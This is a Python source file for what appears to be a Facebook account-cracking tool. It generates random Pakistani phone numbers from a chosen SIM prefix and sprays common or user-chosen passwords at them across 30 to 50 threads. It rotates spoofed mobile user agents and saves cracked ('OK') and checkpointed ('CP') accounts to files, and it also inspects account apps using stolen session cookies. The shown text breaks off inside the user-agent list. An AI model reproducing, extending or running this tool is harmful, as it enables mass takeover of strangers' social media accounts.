#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
#Open source by Younis Xyz [XYZCODERZ]
#FACEBOOK- https://www.facebook.com/noob.hackers
#Github https://github.com/YounisXyz/Xyz



#----------------------[INSTALLING MODULES]----------------#
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} not installed yet')
import requests,bs4,json,os,sys,random,datetime,time,re,subprocess,platform,struct,base64,string,mechanize
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import sleep
from rich import print as printer
from rich.panel import Panel
from rich.panel import Panel as panel
from rich import print as vprint
from rich import print as Buat
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel as Anak
from concurrent.futures import ThreadPoolExecutor as tred
from requests.exceptions import ConnectionError

try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
import time,calendar
from datetime import date,datetime
from time import sleep
pwd_time = int(datetime.now().timestamp())
#----------------------[LOOP/DISPLAYZ]----------------#
Apk = []
ok = []
twof = []
cp = []
id = []
user = []
loop = 0
oks = []
twof = []
cps = []
loop = 0
done = False
sys.stdout.write('\x1b]2; XYZ CODERZ 🌻🔥💯\x07')
#----------------------[BASIC COLORS]----------------#
Z = "\033[0;90m"	 
N = '\x1b[0m'    # 
M = "\x1b[38;5;196m" 
H = "\x1b[38;5;46m"  # Green
K = "\x1b[38;5;226m" # Yellow
B = "\x1b[38;5;44m"  # Blue
U = "\x1b[0;95m"	 # Young
O = "\x1b[0;96m"	 # Light blue
P = "\x1b[38;5;231m" # White
J = "\x1b[38;5;208m" # Orange
A = "\x1b[38;5;248m" # Ashes
X2 = "\x1b[38;5;205m" 
green  =  '\033[1;92m'
yellow =  '\x1b[1;93m'
blue   =  '\x1b[1;94m'
orange =  '\x1b[1;95m'
###----------[ RICH COLOR STYLE ]---------- ###
A2 = "[#AAAAAA]" 
B2 = "#00C8FF" 
B3 = "#00C8FF"
H2 = "[#00FF00]"
H3 = "#00FF00" 
J2 = "[#FF8F00]"
J3 = "#FF8F00" 
K2 = "#FFFF00"
K3 = "#FFFF00"
M2 = "[#FF0000]" 
M3 = "#FF0000"
N2 = "#FF00FF" 
N3 = "#FF00FF" 
Z2 = "[#000000]" 
H2 = "[#00FF00]" 
K2 = "[#FFFF00]" 
B2 = "[#00C8FF]" 
U2 = "[#AF00FF]" 
N2 = "[#FF00FF]" 
O2 = "[#00FFFF]" 
O3 = "#00FFFF" 
P2 = "[#FFFFFF]" 
P3 = "#FFFFFF"
U2 = "[#AF00FF]" 
U3 = "#AF00FF" 
#----------------------[FLASH COLORS / RGB]----------------#
xyzclr=random.choice([H,K,M,O,B,U])
xyzcoderz=random.choice([J3,K3,H3,O3,N3,U3,B3])
xyz = f" {P}[{xyzclr}•{P}]"
colors = ["\033[1;90m", "\033[0;31m", "\033[0;32m", "\033[0;36m", "\033[0;35m", "\033[0;33m", "\033[0;34m"]
colorsy = ["\033[0;32m", "\x1b[38;5;118m"]
colorsz = ["\033[0;33m", "\033[0;31m"]
###----------[ TIME ]---------- ###
now = datetime.now()
day = now.day
month = now.month
year = now.year
month_birthday = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
month_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if month < 0 or month > 12:
		exit()
	month_now = month - 1
except ValueError:exit()
_month_ = month_cek[month_now]
my_date = date.today()
day_now = calendar.day_name[my_date.weekday()]
date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))
#----------------------[DEF CLEAR TERMINAL]----------------#
def clear():
	os.system("clear")
	print(logo)
#----------------------[TOOL LOGIN]----------------#
os.system("clear")
os.system('xdg-open https://www.facebook.com/noob.hackers')
print("\n\r\x1b[1;97m\x1b[1;41m TOLL IS FREE NOT FOR SALE \x1b[0m")
x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
vprint(panel(x,style=f"{xyzcoderz}"))
x=f"{P2}[{H2}•{P2}] Author  : Younis john\n{P2}[{H2}•{P2}] Facebook: fb.me/noob.hackers\n{P2}[{H2}•{P2}] Github  : github.com/YounisXyz"
vprint(panel(x,style=f"{xyzcoderz}"))
print("\n\x1b[1;97m\x1b[1;44m M E N U \x1b[0m\x1b[1;97m\x1b[1;41m L O G I N \x1b[0m")
x=f"{P2}Toll Login First With Password"
vprint(panel(x,style=f"{xyzcoderz}"))
Password = "XYZHACKERZ" # --> Data Req Api key --> open_xyz(life)("XYZHACKERZ")

Xxx = 'true'
while (Xxx == 'true'):
    passcode = input(f"{xyz} Enter Toll Password : ")
    if (passcode == Password):
            Xxx = 'false'
            x=f"{H2}Password is Correct ✓"
            vprint(panel(x,style=f"{xyzcoderz}"));time.sleep(2)
    else:
            x=f"{M2}Password is Incorrect ✘"
            vprint(panel(x,style=f"{xyzcoderz}"))
            opt = input('\n\033[1;92mPress enter contact developer to get Toll Password ')
            os.system('xdg-open https://m.me/xyzhackers')
            x=f"{P2}<\> If You Get The Password, Run Again-"
            vprint(panel(x,style=f"{xyzcoderz}"))
            exit()
   

#----------------------[LOGO]----------------#                   
          
logo ="""\x1b[1;97m\x1b[1;44m Coded By \x1b[0m\x1b[1;97m\x1b[1;41m Younis John \x1b[0m """
def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r loading... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print()
###-------------[CHECK APPLICATION]---------###
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\033[1;31m[🎮]  SORRY THERE IS NO ACTIVE APS! ')
    else:
        print(f'\r\033[1;33m[🎮]  YOUR ACTIVE APPLICATION  DETAILS :')
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r\033[1;36m[🍪]  SORRY, APK CHECK FAILED INVALID  COOKIE! ')
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\033[1;31m[🎮]  SORRY THERE IS NO EXPIRE APS! ')
    else:
        print(f'\r\033[1;33m[🎮]  YOUR EXPIRE APPLICATION  DETAILS :')
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            print(f'\r\033[1;36m[🍪]  SORRY, APK CHECK FAILED INVALID  COOKIE! ')

#----------------------[CHECK CREATION YEAR]----------------#         
def joined(cid):
    if len(cid)==15:
        if cid[:10] in ['1000000000']       :creation = ' 2009'
        elif cid[:9] in ['100000000']       :creation = ' 2009'
        elif cid[:8] in ['10000000']        :creation = ' 2009'
        elif cid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
        elif cid[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
        elif cid[:6] in ['100001']          :creation = ' 2010 | 2010'
        elif cid[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
        elif cid[:6] in ['100004']          :creation = ' 2012 | 2013'
        elif cid[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
        elif cid[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
        elif cid[:6] in ['100009']          :creation = ' 2015' 
        elif cid[:5] in ['10001']           :creation = ' 2015 | 2016'
        elif cid[:5] in ['10002']           :creation = ' 2016 | 2017'
        elif cid[:5] in ['10003']           :creation = ' 2018 | 2019'
        elif cid[:5] in ['10004']           :creation = ' 2019 | 2020'
        elif cid[:5] in ['10005']           :creation = ' 2020'
        elif cid[:5] in ['10006','10007','']:creation = ' 2021'
        elif cid[:5] in ['10008']           :creation = ' 2022'
        elif cid[:5] in ['10009']           :creation = ' 2023'
        else:creation=''
    elif len(cid) in [9,10]:
        creation = ' 2008 | 2009'
    elif len(cid)==8:
        creation = ' 2007 | 2008'
    elif len(cid)==7:
        creation = ' 2006 | 2007'
    else:creation=''
    return creation
 
#----------------------[MAIN MENU]----------------#        
def YounisJohn():
    clear()   
    x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
    vprint(panel(x,style=f"{xyzcoderz}"))
    x=f"{P2}[{H2}•{P2}] Author  : Younis john\n{P2}[{H2}•{P2}] Facebook: fb.me/noob.hackers\n{P2}[{H2}•{P2}] Github  : github.com/YounisXyz"
    vprint(panel(x,style=f"{xyzcoderz}"))
    x=f"{P2}[01] Start Cloning\n[02] Contact Developer"
    vprint(panel(x,style=f"{xyzcoderz}"))
    opt = input(f'{xyz} select : ')
    if opt in ["1", "01"]:
    #	loadinglisen()
    	password()
    if opt in ["2", "02"]:
    	os.system('xdg-open https://www.facebook.com/noob.hackers')
    	YounisJohn()
    else:
    	print ("\033[0;97m\n  Please select valid option ....")
    	time.sleep(3)
    	YounisJohn()

#----------------------[METHOD PASSWORD]----------------#
def password():
	x=f"{P2}[01] Auto Password \n{P2}[02] Choose Password"
	vprint(panel(x,style=f"{xyzcoderz}"))
	opt = input(f'{xyz} select : ')
	if opt in ["1", "01"]:
		autopassword()
	if opt in ["2", "02"]:
		choosepasswprd()
		exit()
	else:
		print ("\033[1;93m Select Correctly!")
		time.sleep(1)
		Method() 
	

#----------------------[AUTO PASSWORD]----------------#
def autopassword():
    user=[]
    x=f"{P2}Put any Pak Sim code\n{P2}Example: 0300, 0301, 0302, 0311, 0312, 0333, 03341, 0343"
    vprint(panel(x,style=f"{xyzcoderz}"))
    code = input(f"{xyz} select : ")
    x=f"{P2}How many numbers do you want to add ?"
    vprint(panel(x,style=f"{xyzcoderz}"))
    limit = int(input(f'{xyz} select : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
        #open('/sdcard/XYZ-NUMBERS.txt', 'a').write(code+nmp+' | '+nmp+'\n')
    with ThreadPool(max_workers=30) as younisxyz:
	    clear()
	    x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
	    vprint(panel(x,style=f"{xyzcoderz}"))
	    x=f"{P2}[{H2}•{P2}] Author  : Younis john\n{P2}[{H2}•{P2}] Facebook: fb.me/noob.hackers\n{P2}[{H2}•{P2}] Github  : github.com/YounisXyz"
	    vprint(panel(x,style=f"{xyzcoderz}"))
	    tl = str(len(user))
	    x=f"{P2}[{H2}•{P2}] Total ids:{H2} {tl}\n{P2}[{H2}•{P2}] Code You choose:{K2} {code}\n{P2}[{H2}•{P2}] Result {M2}CP {P2}Save to : {M2}John-CP.txt\n{P2}[{H2}•{P2}] Result {H2}OK {P2}Save to : {H2}John-OK.txt\n{P2}[{H2}•{P2}] {H2}ON {M2}OFF{P2} Airplane Mode If No Result"
	    vprint(panel(x,style=f"{xyzcoderz}"))
	    for younis in user:
		    uid = code+younis
		    pwx = [younis,uid,'khankhan','khan1122','khan123']
		    younisxyz.submit(younisxyz_,uid,pwx,tl)
    print('\033[1;37m╭───────────────────────────────────────────────━')
    print('\033[1;97m├───[\033[1;92m•\033[1;97m] \033[1;97mCrack process has been completed')
    print("\033[1;97m├───[\033[1;92m•\033[1;97m] \033[1;91mCP \033[1;97mResult Save to : \033[1;91mJohn-CP.txt")
    print("\033[1;97m╰───[\033[1;92m•\033[1;97m] \033[1;92mOK \033[1;97mResult save to : \033[1;92mJohn-OK.txt")

#----------------------[CHOOSE PASSWORD]----------------#
def choosepasswprd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    xyzapk = input(f"\033[0;97mDo You Want To Show Application ?[\033[1;92my\033[0;97m/\033[1;91mn\033[0;97m]: ")
    if xyzapk in[""]:
    	print(f" \033[1;91m Don't be empty .... ");time.sleep(3);autopassword()
    elif xyzapk in["Y","y"]:
    	Apk.append("y")
    elif xyzapk in["N","n"]:
    	Apk.append("n")
    else:
    	print(f"\n\033[0;97m Please select between y/n ....");time.sleep(3);autopassword()
    x=f"{P2}Put any Pak Sim code\n{P2}Example: 0300, 0301, 0302, 0311, 0312, 0333, 03341, 0343"
    vprint(panel(x,style=f"{xyzcoderz}"))
    code = input(f"{xyz} select : ")
    x=f"{P2}How many numbers do you want to add ?"
    vprint(panel(x,style=f"{xyzcoderz}"))
    limit = int(input(f'{xyz} select : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    x=f"{K2}How many Password do you want to add ?"
    vprint(panel(x,style=f"{xyzcoderz}"))
    passx = int(input(f"{xyz} select : "))
    YounisXYZ = []
    for younis in range(passx):
        pww = input(f"{xyz} Enter Password : ")
        YounisXYZ.append(pww)
    with ThreadPool(max_workers=50) as younisxyz:
        tl = str(len(user))
        clear()
        x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
        vprint(panel(x,style=f"{xyzcoderz}"))
        x=f"{P2}[{H2}•{P2}] Author  : Younis john\n{P2}[{H2}•{P2}] Facebook: fb.me/noob.hackers\n{P2}[{H2}•{P2}] Github  : github.com/YounisXyz"
        vprint(panel(x,style=f"{xyzcoderz}"))
        x=f"{P2}[{H2}•{P2}] Total ids:{H2} {tl}\n{P2}[{H2}•{P2}] Code You choose:{K2} {code}\n{P2}[{H2}•{P2}] Result {M2}CP {P2}Save to : {M2}John-CP.txt\n{P2}[{H2}•{P2}] Result {H2}OK {P2}Save to : {H2}John-OK.txt\n{P2}[{H2}•{P2}] {H2}ON {M2}OFF{P2} Airplane Mode If No Result"
        vprint(panel(x,style=f"{xyzcoderz}"))
        for younisjohn in user:
            #pwx = [love[1:]]
            uid = code+younisjohn
            pwx = [younisjohn,uid]
            for Alina in YounisXYZ:
                pwx.append(Alina)
            younisxyz.submit(younisxyz_,uid,pwx,tl)
    print('\033[1;37m╭───────────────────────────────────────────────━')
    print('\033[1;97m├───[\033[1;92m•\033[1;97m] \033[1;97mCrack process has been completed')
    print("\033[1;97m├───[\033[1;92m•\033[1;97m] \033[1;91mCP \033[1;97mResult Save to : \033[1;91mJohn-CP.txt")
    print("\033[1;97m╰───[\033[1;92m•\033[1;97m] \033[1;92mOK \033[1;97mResult save to : \033[1;92mJohn-OK.txt")
    
    
			

#----------------------[CHACKING - METHOD - PROCESS]----------------#
def younisxyz_(uid,pwx,tl):
	#print(user)
	global loop,cps,oks
	try:
		for ps in pwx:
			#------- KUCH USERAGENTS MNY LGA DEIIY HAIY BAQI AGR AP KUCH SE LGANA CHAHO TO HAII JESY AP NECHY DELH RHY HO, AP KHUD LGA SKTY HO
			#[_____Samsung_Useragents____]##
			agentsxyz = ['Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SM-A146U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 13; SM-A326U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-J326AZ Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
			'Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 13; SM-G781U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 13; SM-A716S Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]', 
			'Mozilla/5.0 (Linux; Android 13; SM-M236L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]', 
			'Mozilla/5.0 (Linux; Android 13; SM-A826S Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]', 
			'Mozilla/5.0 (Linux; Android 13; SM-G781B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]', 
			'Mozilla/5.0 (Linux; Android 13; SM-A716S Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 9; SM-J330FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 13; SM-A515F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 10; SC-02L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]', 
			'Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]', 
			'Mozilla/5.0 (Linux; Android 10; SM-J600G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.155 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]', 
			#[_____TECNO____]##
			'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/363.0.0.6.63;]', 
			'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]', 
			'Mozilla/5.0 (Linux; Android 9; TECNO KC8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/323.0.0.9.106;]', 
			'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]', 
			'Mozilla/5.0 (Linux; U; Android 9; en-us; TECNO KC8 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 PHX/13.2', 
			'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/364.0.0.14.77;]', 
			'Mozilla/5.0 (Linux; Android 9; TECNO KC2j Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/358.0.0.8.62;]', 
			'Mozilla/5.0 (Linux; U; Android 10; pt-br; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 PHX/13.0', 
			'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/354.0.0.8.108;]', 
			'Mozilla/5.0 (Linux; Android 9; TECNO KC8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]', 
			'Mozilla/5.0 (Linux; Android 9; TECNO KC2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]', 
			'Mozilla/5.0 (Linux; Android 9; TECNO KC2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]', 
			'Mozilla/5.0 (Linux; U; Android 10; en-us; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36 PHX/12.3', 
			'Mozilla/5.0 (Linux; Android 9; TECNO KC2j Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 
			'Mozilla/5.0 (Linux; U; Android 10; en-us; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/12.0', 
			'Mozilla/5.0 (Linux; U; Android 10; pt-pt; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/12.2', 
			'Mozilla/5.0 (Linux; U; Android 10; en-us; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/11.4', 
			'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/311.0.0.7.114;]', 
			'Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/291.0.0.44.120;]', 
			'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 115Browser/24.2.0.2', 
			#[_____Infinix____]##
			'Mozilla/5.0 (Linux; Android 12; Infinix X6517 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]',
			'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X622 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
			'Mozilla/5.0 (Linux; Android 11; Infinix X697 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]', 
			'Mozilla/5.0 (Linux; Android 11; Infinix X697 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.1.0.25.132;]',
			'Mozilla/5.0 (Linux; Android 11; Infinix X689D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
